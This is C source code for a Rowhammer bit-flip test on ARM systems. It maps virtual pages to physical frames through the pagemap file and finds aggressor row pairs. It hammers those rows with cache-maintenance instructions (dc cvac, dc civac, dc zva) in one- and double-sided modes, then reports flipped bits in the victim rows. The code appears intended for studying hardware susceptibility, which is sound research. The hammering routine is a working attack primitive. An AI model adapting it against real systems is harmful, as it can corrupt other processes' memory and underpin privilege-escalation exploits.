#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <pthread.h>
#include <uchar.h>

// Number of cycles for each pair to hammer
#define HAMMER_CYCLES 2500000
// Size of the memory chunck in which we want to implement the attack
#define CHUNK_SIZE 0x10000000
// Word Size
#define VAL_SIZE sizeof(unsigned long)
// Size of a page (2^12 is a standard size for a page)
#define PAGE_SIZE 4096
// Size of the array used to store virtual page number
#define VPN_SIZE 0x80000
// Number of aggressor paires to be hammered
#define TIMES 150000

#define OUT_INTERVAL  100

unsigned long va_table[VPN_SIZE];         // Virtual page map table
unsigned long chunk[CHUNK_SIZE/VAL_SIZE]; // Chunk of memory to hammer (we are considering word of 32 bits)

//Pair of aggressors data structure
typedef struct candidate {
  unsigned long pa1;
  unsigned long va1;
  unsigned long pa2;
  unsigned long va2;
  struct candidate *next;
} candidate_t;

// Function prototypes
void one_side_hammer(int init_bit, char mode, unsigned long attacker_bit, unsigned long bgn, unsigned long end);
void hammer(int init_bit, char mode, char hammer_type, unsigned long attacker_bit, unsigned long bgn, unsigned long end);
void generate_va_table(int pgmp);
candidate_t * find_candidates(unsigned long addr_bgn, unsigned long addr_end, unsigned page_bits, unsigned target_bit);
void cleanup_candidates(candidate_t *);

int main(int argc, char **argv) {
  //pagemap file identifier
  int pgmp;
  char path[200];

  char pattern, mode, hammer_type;
  int l, j, cnt = 0;
  int init_bit;

  // Addresses on 64 bits
  unsigned long addr1, addr2;
  unsigned long temp;

  // Beginning and end addresses of the chunk
  unsigned long bgn, end;

  // Recover the pagemap file id for this process
  sprintf(path, "/proc/%u/pagemap", getpid());
  pgmp = open(path, O_RDONLY);
  if (pgmp == -1) {
    printf("Unable to open pagemap file\n");
    exit(-1);
  }

  printf("Memory patterns:\n1 - All 1s\n2 - All 0s\n");
  printf("Select memory pattern: ");
  pattern = getchar() - '0';
  getchar(); // Clean buffer

  printf("\nType of hammer:\n1 - One-sided hammering\n2 - Double-sided hammering\n");
  printf("Select type of hammering:");
  hammer_type = getchar() - '0';
  getchar(); // Clean buffer

  printf("\nMode:\n1 - DC CVAC (str)\n2 - DC CIVAC (str)\n3 - DC ZVA\n");
  printf("Select mode: ");
  mode = getchar() - '0';
  getchar(); // Clean buffer (Just to be safe, even if we don't read anymore)

  //Initializing the chunck with the selected pattern
  switch (pattern) {
    case 1:
      init_bit = 1;
      temp = 0;
      for (int i = 0; i < CHUNK_SIZE / VAL_SIZE; ++i)
        chunk[i] = -init_bit;
      break;

    case 2:
      init_bit = 0;
      temp = 1;
      for (int i = 0; i < CHUNK_SIZE / VAL_SIZE; ++i)
        chunk[i] = 0;
      break;

    default:
      printf("Error in pattern selection\n");
      exit(-1);
      break;
  }

  // Generate physical address to virtual address mapping using pagemap file
  generate_va_table(pgmp);

  // Find candidate rows
  bgn = (unsigned long) chunk;
  end = bgn + CHUNK_SIZE;

  hammer(init_bit, mode, hammer_type, temp, bgn, end);
  return 0;
}

void hammer(int init_bit, char mode, char hammer_type, unsigned long attacker_bit, unsigned long bgn, unsigned long end){

  int l, j, cnt;                         // Counters for loops
  candidate_t *head, *curr;              // Candidate line to attack structures
  unsigned long addr1, addr2, val;       // Addresses on 64 bits
  unsigned long read_tempval;            // Value to be read temporarily for one-sided hammering

  // Addresses of attacker rows and victim rows
  unsigned long attk_pa1, attk_pa2, attk_pfn1, attk_pfn2;
  unsigned long vctm_pa, vctm_off, vctm_pfn, *vctm_va;

  // Hammer all possible attacker rows found
  head = find_candidates(bgn, end, 12, 16);

  // Reset counter of bit flips
  cnt = 0;

  for (l = 0, curr = head; l < TIMES && curr != NULL; ++l, curr = curr->next) {
    // Get physical and virtual address for attacker rows
    attk_pa1 = curr->pa1;
    attk_pa2 = curr->pa2;
    attk_pfn1 = attk_pa1 / PAGE_SIZE;
    attk_pfn2 = attk_pa2 / PAGE_SIZE;
    addr1 = curr->va1;
    addr2 = curr->va2;

    switch(hammer_type) {
      // One-sided
      case 1:
        switch (mode) {
          //DC CVAC
          case 1:
            for (j = 0; j < HAMMER_CYCLES; ++j) {
              asm volatile("str %2, [%0]\n\t"
                           "ldr %3, [%1]\n\t"
                           "dc cvac, %0\n\t"
                           "dc cvac, %1\n\t"
                           ::"r"(addr1), "r"(addr2), "r"(attacker_bit), "r"(read_tempval));
            }
            break;

          //DC CIVAC
          case 2:
              for (j = 0; j < HAMMER_CYCLES; ++j) {
                asm volatile("str %2, [%0]\n\t"
                             "ldr %3, [%1]\n\t"
                             "dc civac, %0\n\t"
                             "dc civac, %1\n\t"
                             ::"r" (addr1), "r" (addr2), "r" (attacker_bit), "r"(read_tempval));
              }
            break;

          //DC ZVA
          case 3:
              for (j = 0; j < HAMMER_CYCLES; ++j) {
                asm volatile("dc zva, %0\n\t"
                             ::"r" (addr1));
                /*
                asm volatile("ldr %2, [%1]\n\t"
                             "dc cvac, %1\n\t"
                             "dc zva, %0\n\t"
                             ::"r" (addr1), "r"(addr2), "r"(read_tempval));
                */
              }
            break;

          // Undefined behaviour
          default:
              printf("Error in mode selection\n");
              exit(-1);
            break;
        }
        break;

      // Double-sided
      case 2:
        switch (mode) {
          //DC CVAC
          case 1:
            for (j = 0; j < HAMMER_CYCLES; ++j) {
              // Hammering using DC CVAC
              asm volatile("str %2, [%0]\n\t"
                           "str %2, [%1]\n\t"
                           "dc cvac, %0\n\t"
                           "dc cvac, %1\n\t"
                           ::"r"(addr1), "r"(addr2), "r"(attacker_bit));
            }
            break;

          //DC CIVAC
          case 2:
              for (j = 0; j < HAMMER_CYCLES; ++j) {
                asm volatile("str %2, [%0]\n\t"
                             "str %2, [%1]\n\t"
                             "dc civac, %0\n\t"
                             "dc civac, %1\n\t"
                             ::"r" (addr1), "r" (addr2), "r" (attacker_bit));
              }
            break;

          //DC ZVA
          case 3:
              for (j = 0; j < HAMMER_CYCLES; ++j) {
                asm volatile("dc zva, %0\n\t"
                             "dc zva, %1\n\t"
                             ::"r" (addr1), "r" (addr2));
              }
            break;

          // Mode undefined
          default:
              printf("Error in mode selection\n");
              exit(-1);
            break;
        }
        break;

      default:
        printf("Error: type of hammering not defined!\n");
        exit(-1);
        break;
    }


    // check victim row for bit flips
    for (j = 0; j < (1 << 15); j += VAL_SIZE) {
      vctm_pa = (attk_pfn1 + attk_pfn2) / 2 * PAGE_SIZE + j;
      vctm_off = vctm_pa % PAGE_SIZE;
      vctm_pfn = vctm_pa / PAGE_SIZE;
      // if victim row is not present
      if (va_table[vctm_pfn] == 0)
        continue;
      // get virtual address of victim address
      vctm_va = (unsigned long *)(va_table[vctm_pfn] + vctm_off);
      val = *vctm_va;
      // output results if any bit flips occur
      if (val != -init_bit) {
        cnt++;
        printf("attacker1:%lx\tattacker2:%lx\n", attk_pa1, attk_pa2);
        printf("cnt:%u victim:%lx becomes %lx\n", cnt, vctm_pa, val);
      }
      // reset values in victim rows
      *vctm_va = -init_bit;
    }
  }

  return;
}

// Function to generate physical to virtual address mapping
void generate_va_table(int pgmp){

  unsigned long data, index, pfn;

    for (int i = 0; i < CHUNK_SIZE / VAL_SIZE; i += PAGE_SIZE / VAL_SIZE){

      index = (unsigned long)&chunk[i] / PAGE_SIZE * sizeof(data);

      // read data in pagemap file
      if (pread(pgmp, &data, sizeof(data), index) != sizeof(data)) {
        perror("pread");
        break;
      }
      // store the virtual page number
      pfn = data & 0x7fffffffffffff;
      if (pfn <= 0 || pfn > VPN_SIZE){
        perror("VPN_TABLE TOO SMALL");
        break;
      }
      else{
        va_table[pfn] = index / sizeof(data) * PAGE_SIZE;
      }
  }
}

candidate_t * find_candidates(unsigned long addr_bgn, unsigned long addr_end, unsigned page_bits, unsigned target_bit) {

  unsigned i;
  unsigned page_size = 1 << page_bits;
  FILE *fp;
  char path[200];
  unsigned long va;
  unsigned long pa;
  u_int64_t offset;
  u_int64_t val;
  u_int64_t pfn;

  candidate_t *head = NULL;
  candidate_t *temp = NULL;
  candidate_t *prev;
  candidate_t *curr;

  // if page_bits is 12, then 11...0 are used for page offset
  if (addr_end <= addr_bgn || target_bit < page_bits) {
    printf("not well-defined arguments\n");
    exit(-1);
  }

  // Open the pagemap file as a binary file in read mode
  sprintf(path, "/proc/%u/pagemap", getpid());
  fp = fopen(path, "rb");
  if (fp == NULL) {
    printf("Unable to open pagemap file\n");
    exit(-1);
  }

  // So, we consider the first n-page_bits as the bits which represent the base address to align our accesses
  // To obtain it, we remove the offset introduced by the lower page_bits by shifting right and then left by the same amount
  // Example: consider addr_bgn = 0xABCD and page_bits = 4
  va = addr_bgn >> page_bits;   // va = 0x0ABC
  va <<= page_bits;             // va = 0xABC0

  // If we are at the beginning of the chunk, it is okay
  // Otherwise, add an offset to align to the correct address inside the chunk
  if (va < addr_bgn)            // In this case we enter
    va += page_size;            // Move inside the page by adding 10000 to va

  while (va < addr_end) {
    // We move from page to page inside our chunk of memory
    // Here we compute the offset inside the page we are currently checking
    offset = va / page_size * 8;
    fseek(fp, offset, SEEK_SET);
    val = 0;

    // ?
    for (i = 0; i < 8; ++i) {
      unsigned char c = getc(fp);
      val |= ((u_int64_t) c << (8 * i));
    }

    if ( (val & 0x8000000000000000) == 0) {
      printf("some page is not in memory yet\n");
      exit(-1);
    }

    // Virtual page number (?)
    pfn = val & 0x7FFFFFFFFFFFFF;
    pa = pfn << page_bits;

    prev = NULL;
    curr = temp;

    // Linked list management for candidate rows nodes
    while (curr != NULL) {
      // XOR between current physical address (1) and computed pa must be equal to target address (?)
      if ((pa ^ curr->pa1) != (1 << target_bit)) {
        prev = curr;
        curr = curr->next;
        continue;
      }
      // Matching candidate is found, so move it into another list
      curr->pa2 = pa;
      curr->va2 = va;
      if (prev != NULL)
        prev->next = curr->next;
      else
        temp = curr->next;
      curr->next = head;
      head = curr;
      break;
    }

    // if we didn't find a matching candidate
    if (curr == NULL) {
      curr = (candidate_t *) malloc(sizeof(candidate_t));
      curr->pa1 = pa;
      curr->va1 = va;
      curr->next = temp;
      temp = curr;
    }

    // Move to next page
    va += page_size;
  }

  cleanup_candidates(temp);
  return head;
}

void cleanup_candidates(candidate_t *head){
  candidate_t *curr;

  while (head != NULL) {
    curr = head;
    head = head->next;
    free(curr);
  }
}
